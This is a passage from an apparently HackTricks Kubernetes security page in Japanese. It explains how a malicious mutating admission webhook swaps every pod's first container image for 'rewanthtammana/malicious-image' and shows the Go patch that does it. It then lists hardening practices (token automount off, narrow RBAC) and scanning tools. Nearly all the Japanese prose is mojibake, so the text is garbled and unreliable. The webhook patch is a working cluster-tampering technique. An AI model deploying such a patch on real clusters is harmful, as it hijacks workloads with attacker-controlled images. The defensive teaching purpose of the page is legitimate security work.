ä¸Šã®ç”»åƒã§è¦‹ã‚‹ã‚ˆã†ã«ã€ç§ãŸã¡ã¯`nginx`ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã—ãŸãŒã€æœ€çµ‚çš„ã«å®Ÿè¡Œã•ã‚ŒãŸã‚¤ãƒ¡ãƒ¼ã‚¸ã¯`rewanthtammana/malicious-image`ã§ã™ã€‚ä½•ãŒèµ·ã“ã£ãŸã®ã§ã—ã‚‡ã†ã‹ï¼ï¼Ÿ

#### æŠ€è¡“çš„ãªè©³ç´° <a href="#heading-technicalities" id="heading-technicalities"></a>

èµ·ã“ã£ãŸã“ã¨ã‚’è§£æ˜ã—ã¾ã™ã€‚å®Ÿè¡Œã—ãŸ`./deploy.sh`ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã‚’ä½œæˆã—ã¾ã—ãŸã€‚ä»¥ä¸‹ã®è¡Œã¯ã€ä¸Šè¨˜ã®çµæœã«è²¬ä»»ãŒã‚ã‚Šã¾ã™ã€‚
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
ä¸Šè¨˜ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆã§ã¯ã€ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã®æœ€åˆã®ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ `rewanthtammana/malicious-image` ã«ç½®ãæ›ãˆã¾ã™ã€‚

## ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹

### **ãƒãƒƒãƒ‰ã§ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®è‡ªå‹•ãƒã‚¦ãƒ³ãƒˆã‚’é˜²æ­¢ã™ã‚‹**

ãƒãƒƒãƒ‰ãŒä½œæˆã•ã‚Œã‚‹ã¨ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆåŒã˜åå‰ç©ºé–“ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼‰ãŒè‡ªå‹•çš„ã«ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã¾ã™ã€‚ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ãŒè‡ªèº«å†…éƒ¨ã‹ã‚‰APIã‚’åˆ©ç”¨ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

ãƒãƒ¼ã‚¸ãƒ§ãƒ³1.6ä»¥é™ã§ã¯ã€automountServiceAccountToken: false ã‚’ä½¿ç”¨ã—ã¦ã€ãƒãƒƒãƒ‰ã§ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®è‡ªå‹•ãƒã‚¦ãƒ³ãƒˆã‚’é˜²æ­¢ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¾ãŸã¯ãƒãƒƒãƒ‰ã§ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«è¿½åŠ ã™ã‚‹å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«è¿½åŠ ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

ã¾ãŸã€ãƒãƒƒãƒ‰ã§ã‚‚ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«RoleBindings\ClusterRoleBindingsã‚’ä»˜ä¸ã™ã‚‹**

RoleBindings\ClusterRoleBindingsã‚’ä½œæˆã™ã‚‹éš›ã«ã¯ã€ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°å†…ã§å½¹å‰²ãŒå¿…è¦ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ã“ã®ã‚ˆã†ãªã‚°ãƒ«ãƒ¼ãƒ—ã«é–¢ä¿‚ã®ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å¿˜ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

### **ClusterRolesã¨ClusterRoleBindingsã®ä»£ã‚ã‚Šã«Rolesã¨RoleBindingsã‚’ä½¿ç”¨ã™ã‚‹**

ClusterRolesã¨ClusterRoleBindingsã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãã‚Œã‚‰ã¯ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ã«é©ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚ˆã†ãªã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ã™ã¹ã¦ã®åå‰ç©ºé–“ã«å¯¾ã—ã¦æ¨©é™ã‚’æŒã¡ã¾ã™ãŒã€ã“ã‚Œã¯å¿…è¦ãªã„å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚Rolesã¨RoleBindingsã¯ç‰¹å®šã®åå‰ç©ºé–“ã«é©ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®åˆ¥ã®ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’æä¾›ã—ã¾ã™ã€‚

### **è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ã®ä½¿ç”¨**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **å‚è€ƒæ–‡çŒ®**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
